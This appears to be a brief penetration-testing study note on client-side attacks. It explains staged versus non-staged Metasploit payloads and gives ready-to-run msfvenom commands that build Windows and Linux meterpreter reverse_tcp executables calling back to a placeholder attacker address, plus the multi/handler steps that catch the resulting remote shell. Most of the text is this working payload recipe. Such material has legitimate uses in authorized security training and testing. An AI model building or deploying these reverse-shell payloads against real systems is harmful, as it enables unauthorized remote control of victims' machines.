- A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.

- Msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.

- Payload path structure: OS/Architecture/Type/Protocol

- Difference between staged and non-staged payload:
    - Staged payload: Going through a handler to make a link between attacker and target. The first payload trigger the second one when connecting to the handler.
    - Non-staged payload: Literally a reverse shell binary connecting to the attacker listener.

---

```bash
[+] List payloads
> msfvenom --list payloads

[+] Staged Payload creation for windows (32 bits)
> msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /path/to/payload.exe

[+] Staged Payload creation for linux (64 bits)
> msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > /path/to/binary

[+] Creation of handler to catch the payload execution
msf > use multi/hanlder
msf > set payload windows/meterpreter/reverse_tcp
msf > set OPTIONS left
msf > run
If the binary is executed, we will get a meterpreter.
```